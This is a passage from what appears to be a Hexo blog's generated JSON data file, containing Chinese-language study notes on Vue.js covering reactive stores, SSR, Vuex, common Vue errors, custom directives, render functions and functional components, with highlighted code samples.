class=\"hljs-keyword\">import</span> &#123; reactive &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span>;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> store=<span class=\"hljs-title function_\">reactive</span>(&#123;<br>    <span class=\"hljs-attr\">count</span>:<span class=\"hljs-number\">0</span><br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">//componentA<br>&lt;script&gt;<br>\timport &#123; store &#125; from &#x27;./store.js&#x27;<br>    <br>    export default &#123;<br>        data()&#123;<br>            return&#123;<br>                store,<br>            &#125;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;template&gt;<br>From A:&#123;&#123; store.count &#125;&#125;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">//componentB<br>&lt;script&gt;<br>\timport &#123; store &#125; from &#x27;./store.js&#x27;<br>    <br>    export default &#123;<br>        data()&#123;<br>            return&#123;<br>                store,<br>            &#125;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;template&gt;<br>From B:&#123;&#123; store.count &#125;&#125;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure>\n\n<p>现在，所有引入了store的组件都可以改动count，但是从长远看这种代码是不容易维护的。</p>\n<p>解决方法：在store上定义方法，方法的名字需要能表达意图；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//store.js</span><br><span class=\"hljs-keyword\">import</span> &#123; reactive &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span>;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> store=<span class=\"hljs-title function_\">reactive</span>(&#123;<br>    <span class=\"hljs-attr\">count</span>:<span class=\"hljs-number\">0</span>，<br>    <span class=\"hljs-title function_\">increment</span>(<span class=\"hljs-params\"></span>)&#123;<br>    \t<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">count</span>++<br>\t&#125;,<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&lt;template&gt;<br>  &lt;button @click=&quot;store.increment()&quot;&gt;<br>    From B: &#123;&#123; store.count &#125;&#125;<br>  &lt;/button&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-SSR（Server-Side-Rendering）服务端渲染\"><a href=\"#4-SSR（Server-Side-Rendering）服务端渲染\" class=\"headerlink\" title=\"4.SSR（Server-Side Rendering）服务端渲染\"></a>4.SSR（Server-Side Rendering）服务端渲染</h4><blockquote>\n<p>默认情况下，Vue 组件的职责是在浏览器中生成和操作 DOM。然而，Vue 也支持将组件在服务端直接渲染成 HTML 字符串，作为服务端响应返回给浏览器，最后在浏览器端将静态的 HTML“激活”(hydrate) 为能够交互的客户端应用。 </p>\n</blockquote>\n<h5 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h5><ul>\n<li>更快的首屏加载：服务端渲染的 HTML 无需等到所有的 JavaScript 都下载并执行完成之后才显示，所以你的用户将会更快地看到完整渲染的页面。数据获取过程在首次访问时在服务端完成，相比于从客户端获取，可能有更快的数据库连接。</li>\n<li>统一的心智模型</li>\n<li>更好的SEO：搜索引擎爬虫可以直接看到完全渲染的页面。</li>\n</ul>\n<h2 id=\"二、使用\"><a href=\"#二、使用\" class=\"headerlink\" title=\"二、使用\"></a>二、使用</h2><h3 id=\"1-最简单的store\"><a href=\"#1-最简单的store\" class=\"headerlink\" title=\"1.最简单的store\"></a>1.最简单的store</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; createApp &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vue&#x27;</span><br><span class=\"hljs-keyword\">import</span> &#123; createStore &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;vuex&#x27;</span><br><br><span class=\"hljs-comment\">// 创建一个新的 store 实例</span><br><span class=\"hljs-keyword\">const</span> store = <span class=\"hljs-title function_\">createStore</span>(&#123;<br>  state () &#123;<br>    <span class=\"hljs-keyword\">return</span> &#123;<br>      <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span><br>    &#125;<br>  &#125;,<br>  <span class=\"hljs-attr\">mutations</span>: &#123;<br>    increment (state) &#123;<br>      state.<span class=\"hljs-property\">count</span>++<br>    &#125;<br>  &#125;<br>&#125;)<br><br><span class=\"hljs-keyword\">const</span> app = <span class=\"hljs-title function_\">createApp</span>(&#123; <span class=\"hljs-comment\">/* 根组件 */</span> &#125;)<br><br><span class=\"hljs-comment\">// 将 store 实例作为插件安装</span><br>app.<span class=\"hljs-title function_\">use</span>(store)<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n"},{"title":"Vue笔记","date":"2020-11-11T18:51:45.000Z","mp3":null,"cover":"img/vue.png","_content":"\n# VUE错误笔记\n\n1.Component template should contain exactly one root element. If you are using v-if on multiple element\n\n解决方法：每个 Component只能有一个<div></div>div>，所有的代码需要放进这个div中。\n\n2.错误缩进\n\n解决方案：关闭缩进报错工具。\n\n\n\n\n\n# VUE备忘笔记\n\n1.Computed Properties与普通方法的区别\n\ncomputed properties 会把结果“缓存”起来，每次调用对应的Computed Properties如果所依赖的数据没有变动，则使用已经计算好的值；\n\n2.watch表示监听方法\n\n可以监控vue对象中数据的变换；\n\n3.两者比较：\n\n```javascript\n  watch:{\n                city:function(city_name){\n                    this.full_address=city_name+'-'+this.street;\n                },\n                street:function(street_name){\n                    this.full_address=this.city+'-'+street_name;\n                }\n            },\n            computed:{\n                full_address1:function(){\n                    return full_address1=this.city+' '+this.street\n                }\n```\n\n4.component命名规则：小写字母+横线\n\n例子：\n\n```vue\nVue.component('my-component-name', { /*....*/})\n```\n\nW3C规范：\n\n```vue\nVue.component('MyComponentName', { /*....*/})\n```\n\n可以使用\\<MyConponentName\\/>调用；","source":"_posts/VUE错误笔记.md","raw":"---\ntitle: Vue笔记\ndate: 2020-11-12 2:51:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\nmp3: \ncover: img/vue.png\n---\n\n# VUE错误笔记\n\n1.Component template should contain exactly one root element. If you are using v-if on multiple element\n\n解决方法：每个 Component只能有一个<div></div>div>，所有的代码需要放进这个div中。\n\n2.错误缩进\n\n解决方案：关闭缩进报错工具。\n\n\n\n\n\n# VUE备忘笔记\n\n1.Computed Properties与普通方法的区别\n\ncomputed properties 会把结果“缓存”起来，每次调用对应的Computed Properties如果所依赖的数据没有变动，则使用已经计算好的值；\n\n2.watch表示监听方法\n\n可以监控vue对象中数据的变换；\n\n3.两者比较：\n\n```javascript\n  watch:{\n                city:function(city_name){\n                    this.full_address=city_name+'-'+this.street;\n                },\n                street:function(street_name){\n                    this.full_address=this.city+'-'+street_name;\n                }\n            },\n            computed:{\n                full_address1:function(){\n                    return full_address1=this.city+' '+this.street\n                }\n```\n\n4.component命名规则：小写字母+横线\n\n例子：\n\n```vue\nVue.component('my-component-name', { /*....*/})\n```\n\nW3C规范：\n\n```vue\nVue.component('MyComponentName', { /*....*/})\n```\n\n可以使用\\<MyConponentName\\/>调用；","slug":"VUE错误笔记","published":1,"updated":"2020-11-12T14:54:48.000Z","_id":"clg29vyho004cao9c3ck3c76x","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"VUE错误笔记\"><a href=\"#VUE错误笔记\" class=\"headerlink\" title=\"VUE错误笔记\"></a>VUE错误笔记</h1><p>1.Component template should contain exactly one root element. If you are using v-if on multiple element</p>\n<p>解决方法：每个 Component只能有一个<div></div>div&gt;，所有的代码需要放进这个div中。</p>\n<p>2.错误缩进</p>\n<p>解决方案：关闭缩进报错工具。</p>\n<h1 id=\"VUE备忘笔记\"><a href=\"#VUE备忘笔记\" class=\"headerlink\" title=\"VUE备忘笔记\"></a>VUE备忘笔记</h1><p>1.Computed Properties与普通方法的区别</p>\n<p>computed properties 会把结果“缓存”起来，每次调用对应的Computed Properties如果所依赖的数据没有变动，则使用已经计算好的值；</p>\n<p>2.watch表示监听方法</p>\n<p>可以监控vue对象中数据的变换；</p>\n<p>3.两者比较：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-attr\">watch</span>:&#123;<br>              <span class=\"hljs-attr\">city</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">city_name</span>)&#123;<br>                  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">full_address</span>=city_name+<span class=\"hljs-string\">&#x27;-&#x27;</span>+<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">street</span>;<br>              &#125;,<br>              <span class=\"hljs-attr\">street</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">street_name</span>)&#123;<br>                  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">full_address</span>=<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">city</span>+<span class=\"hljs-string\">&#x27;-&#x27;</span>+street_name;<br>              &#125;<br>          &#125;,<br>          <span class=\"hljs-attr\">computed</span>:&#123;<br>              <span class=\"hljs-attr\">full_address1</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                  <span class=\"hljs-keyword\">return</span> full_address1=<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">city</span>+<span class=\"hljs-string\">&#x27; &#x27;</span>+<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">street</span><br>              &#125;<br></code></pre></td></tr></table></figure>\n\n<p>4.component命名规则：小写字母+横线</p>\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">Vue.component(&#x27;my-component-name&#x27;, &#123; /*....*/&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>W3C规范：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">Vue.component(&#x27;MyComponentName&#x27;, &#123; /*....*/&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>可以使用&lt;MyConponentName/&gt;调用；</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"VUE错误笔记\"><a href=\"#VUE错误笔记\" class=\"headerlink\" title=\"VUE错误笔记\"></a>VUE错误笔记</h1><p>1.Component template should contain exactly one root element. If you are using v-if on multiple element</p>\n<p>解决方法：每个 Component只能有一个<div></div>div&gt;，所有的代码需要放进这个div中。</p>\n<p>2.错误缩进</p>\n<p>解决方案：关闭缩进报错工具。</p>\n<h1 id=\"VUE备忘笔记\"><a href=\"#VUE备忘笔记\" class=\"headerlink\" title=\"VUE备忘笔记\"></a>VUE备忘笔记</h1><p>1.Computed Properties与普通方法的区别</p>\n<p>computed properties 会把结果“缓存”起来，每次调用对应的Computed Properties如果所依赖的数据没有变动，则使用已经计算好的值；</p>\n<p>2.watch表示监听方法</p>\n<p>可以监控vue对象中数据的变换；</p>\n<p>3.两者比较：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-attr\">watch</span>:&#123;<br>              <span class=\"hljs-attr\">city</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">city_name</span>)&#123;<br>                  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">full_address</span>=city_name+<span class=\"hljs-string\">&#x27;-&#x27;</span>+<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">street</span>;<br>              &#125;,<br>              <span class=\"hljs-attr\">street</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">street_name</span>)&#123;<br>                  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">full_address</span>=<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">city</span>+<span class=\"hljs-string\">&#x27;-&#x27;</span>+street_name;<br>              &#125;<br>          &#125;,<br>          <span class=\"hljs-attr\">computed</span>:&#123;<br>              <span class=\"hljs-attr\">full_address1</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                  <span class=\"hljs-keyword\">return</span> full_address1=<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">city</span>+<span class=\"hljs-string\">&#x27; &#x27;</span>+<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">street</span><br>              &#125;<br></code></pre></td></tr></table></figure>\n\n<p>4.component命名规则：小写字母+横线</p>\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">Vue.component(&#x27;my-component-name&#x27;, &#123; /*....*/&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>W3C规范：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">Vue.component(&#x27;MyComponentName&#x27;, &#123; /*....*/&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>可以使用&lt;MyConponentName/&gt;调用；</p>\n"},{"title":"Vue.js实战（6）","date":"2020-12-01T13:18:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n\n# Ch8 自定义命令\n\n### 一、基本用法\n\n```javascript\n//全局注册\n\n    Vue.directive('focus',{\n            //指令选项\n        })\n//局部注册，作用域在app内\n        var app=new Vue({\n            el:\"#app\",\n            directives:{\n                focus:{\n                    //指令选项\n                }\n            }\n        })\n```\n\n1. bind：第一次绑定到元素时使用；\n2. inserted：被绑定元素插入父节点时使用；\n3. update：绑定元素模板更新时使用，不论绑定值是否发生变化；\n4. componentUpdated：被绑定元素完成一次更新周期时使用；\n5. unbind： 指令与元素解绑时调用；\n\n### 二、实战\n\n代码已经存在电脑\n\n\n\n# Ch9 Render函数\n\n### 一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\n\n```javascript\nvar vNode={\n    tag:'div',\n    attributes:{\n        id:'main'\n    },\n    children:[\n        //p节点\n    ]\n}\n```\n\n1.vNode分类：\n\n| Node           | Function         |\n| -------------- | ---------------- |\n| ElementVnode   | 普通元素节点     |\n| TextVNode      | 文本节点         |\n| ComponentVNode | 组件节点         |\n| EmptyVNode     | 无内容的注释节点 |\n| CloneVNode     | 克隆节点         |\n\n### 二、createElement用法\n\n1.传统方法：\n\n```html\n    <div id=\"app\">\n        <ele></ele>\n\n    </div>\n\n    <script>\n        Vue.component('ele', {\n            template: ' <div id=\"element\" :class=\"{show:show}\" @click=\"handleClick\">元素内容</div>',\n            data: function () {\n                return {\n                    show: true\n                }\n            },\n            methods: {\n                handleClick: function () {\n                    console.log('clock');\n                }\n            }\n        });\n\n        var app = new Vue({\n            el: \"#app\",\n        })\n    </script>\n```\n\n2.使用Render改写后\n\n```html\n    <div id=\"app\">\n        <ele></ele>\n    </div>\n\n    <script>\n        Vue.component('ele', {\n            render: function (createElement) {\n                return createElement(\n                    'div',\n                    {\n                        class: {\n                            'show': this.show\n                        },\n                        attrs: {\n                            id: 'element'\n                        },\n                        on: {\n                            click: this.handleClick\n                        }\n                    },\n                    '文本内容1'\n                )\n            },\n            data: function () {\n                return { show: true }\n            },\n            methods: {\n                handleClick: function () {\n                    console.log('click');\n                }\n            }\n        });\n\n        var app = new Vue({\n            el: \"#app\",\n        })\n    </script>\n```\n\n3，就此例而言，render得写法复杂于template写法，所以在合适的场景使用render\n\n4.约束：所有的组件树中，如果VNODE是组件或者含有slot，那么Vnode必须唯一\n\n5.render函数里创建了一个cloneVNode得工厂函数，通过递归将slot所有子节点克隆一份，并对VNode的关键属性也复制了一份；\n\n### 三、函数化组件\n\n​\t1.vue提供了一个functional的布尔值选项，设置为true可以使组件无状态和无实例，也就没有data和this上下文；render返回虚拟节点也更加容易渲染；\n\n​\t2.函数化组件得是适用场景：\n\n- 程序化得在多个组件中选择一个\n- 在将children，props，data传递给子组件之前操作他们；","source":"_posts/Vue.js实战（6）.md","raw":"---\ntitle: Vue.js实战（6）\ndate: 2020-12-1 21:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n\n# Ch8 自定义命令\n\n### 一、基本用法\n\n```javascript\n//全局注册\n\n    Vue.directive('focus',{\n            //指令选项\n        })\n//局部注册，作用域在app内\n        var app=new Vue({\n            el:\"#app\",\n            directives:{\n                focus:{\n                    //指令选项\n                }\n            }\n        })\n```\n\n1. bind：第一次绑定到元素时使用；\n2. inserted：被绑定元素插入父节点时使用；\n3. update：绑定元素模板更新时使用，不论绑定值是否发生变化；\n4. componentUpdated：被绑定元素完成一次更新周期时使用；\n5. unbind： 指令与元素解绑时调用；\n\n### 二、实战\n\n代码已经存在电脑\n\n\n\n# Ch9 Render函数\n\n### 一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\n\n```javascript\nvar vNode={\n    tag:'div',\n    attributes:{\n        id:'main'\n    },\n    children:[\n        //p节点\n    ]\n}\n```\n\n1.vNode分类：\n\n| Node           | Function         |\n| -------------- | ---------------- |\n| ElementVnode   | 普通元素节点     |\n| TextVNode      | 文本节点         |\n| ComponentVNode | 组件节点         |\n| EmptyVNode     | 无内容的注释节点 |\n| CloneVNode     | 克隆节点         |\n\n### 二、createElement用法\n\n1.传统方法：\n\n```html\n    <div id=\"app\">\n        <ele></ele>\n\n    </div>\n\n    <script>\n        Vue.component('ele', {\n            template: ' <div id=\"element\" :class=\"{show:show}\" @click=\"handleClick\">元素内容</div>',\n            data: function () {\n                return {\n                    show: true\n                }\n            },\n            methods: {\n                handleClick: function () {\n                    console.log('clock');\n                }\n            }\n        });\n\n        var app = new Vue({\n            el: \"#app\",\n        })\n    </script>\n```\n\n2.使用Render改写后\n\n```html\n    <div id=\"app\">\n        <ele></ele>\n    </div>\n\n    <script>\n        Vue.component('ele', {\n            render: function (createElement) {\n                return createElement(\n                    'div',\n                    {\n                        class: {\n                            'show': this.show\n                        },\n                        attrs: {\n                            id: 'element'\n                        },\n                        on: {\n                            click: this.handleClick\n                        }\n                    },\n                    '文本内容1'\n                )\n            },\n            data: function () {\n                return { show: true }\n            },\n            methods: {\n                handleClick: function () {\n                    console.log('click');\n                }\n            }\n        });\n\n        var app = new Vue({\n            el: \"#app\",\n        })\n    </script>\n```\n\n3，就此例而言，render得写法复杂于template写法，所以在合适的场景使用render\n\n4.约束：所有的组件树中，如果VNODE是组件或者含有slot，那么Vnode必须唯一\n\n5.render函数里创建了一个cloneVNode得工厂函数，通过递归将slot所有子节点克隆一份，并对VNode的关键属性也复制了一份；\n\n### 三、函数化组件\n\n​\t1.vue提供了一个functional的布尔值选项，设置为true可以使组件无状态和无实例，也就没有data和this上下文；render返回虚拟节点也更加容易渲染；\n\n​\t2.函数化组件得是适用场景：\n\n- 程序化得在多个组件中选择一个\n- 在将children，props，data传递给子组件之前操作他们；","slug":"Vue.js实战（6）","published":1,"updated":"2020-12-06T08:27:36.000Z","_id":"clg29vyhp004fao9ccyxo3ai3","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch8-自定义命令\"><a href=\"#Ch8-自定义命令\" class=\"headerlink\" title=\"Ch8 自定义命令\"></a>Ch8 自定义命令</h1><h3 id=\"一、基本用法\"><a href=\"#一、基本用法\" class=\"headerlink\" title=\"一、基本用法\"></a>一、基本用法</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//全局注册</span><br><br>    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">directive</span>(<span class=\"hljs-string\">&#x27;focus&#x27;</span>,&#123;<br>            <span class=\"hljs-comment\">//指令选项</span><br>        &#125;)<br><span class=\"hljs-comment\">//局部注册，作用域在app内</span><br>        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;<br>            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,<br>            <span class=\"hljs-attr\">directives</span>:&#123;<br>                <span class=\"hljs-attr\">focus</span>:&#123;<br>                    <span class=\"hljs-comment\">//指令选项</span><br>                &#125;<br>            &#125;<br>        &#125;)<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li>bind：第一次绑定到元素时使用；</li>\n<li>inserted：被绑定元素插入父节点时使用；</li>\n<li>update：绑定元素模板更新时使用，不论绑定值是否发生变化；</li>\n<li>componentUpdated：被绑定元素完成一次更新周期时使用；</li>\n<li>unbind： 指令与元素解绑时调用；</li>\n</ol>\n<h3 id=\"二、实战\"><a href=\"#二、实战\" class=\"headerlink\" title=\"二、实战\"></a>二、实战</h3><p>代码已经存在电脑</p>\n<h1 id=\"Ch9-Render函数\"><a href=\"#Ch9-Render函数\" class=\"headerlink\" title=\"Ch9 Render函数\"></a>Ch9 Render函数</h1><h3 id=\"一、Virtual-Dom：一个JavaScript对象，在状态发生变化时，Virtual-Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\"><a href=\"#一、Virtual-Dom：一个JavaScript对象，在状态发生变化时，Virtual-Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\" class=\"headerlink\" title=\"一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\"></a>一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> vNode=&#123;<br>    <span class=\"hljs-attr\">tag</span>:<span class=\"hljs-string\">&#x27;div&#x27;</span>,<br>    <span class=\"hljs-attr\">attributes</span>:&#123;<br>        <span class=\"hljs-attr\">id</span>:<span class=\"hljs-string\">&#x27;main&#x27;</span><br>    &#125;,<br>    <span class=\"hljs-attr\">children</span>:[<br>        <span class=\"hljs-comment\">//p节点</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>1.vNode分类：</p>\n<table>\n<thead>\n<tr>\n<th>Node</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ElementVnode</td>\n<td>普通元素节点</td>\n</tr>\n<tr>\n<td>TextVNode</td>\n<td>文本节点</td>\n</tr>\n<tr>\n<td>ComponentVNode</td>\n<td>组件节点</td>\n</tr>\n<tr>\n<td>EmptyVNode</td>\n<td>无内容的注释节点</td>\n</tr>\n<tr>\n<td>CloneVNode</td>\n<td>克隆节点</td>\n</tr>\n</tbody></table>\n<h3 id=\"二、createElement用法\"><a href=\"#二、createElement用法\" class=\"headerlink\" title=\"二、createElement用法\"></a>二、createElement用法</h3><p>1.传统方法：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">ele</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">ele</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;ele&#x27;</span>, &#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">&#x27; &lt;div id=&quot;element&quot; :class=&quot;&#123;show:show&#125;&quot; @click=&quot;handleClick&quot;&gt;元素内容&lt;/div&gt;&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-keyword\">return</span> &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">show</span>: <span class=\"hljs-literal\">true</span></span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">handleClick</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;clock&#x27;</span>);</span><br><span 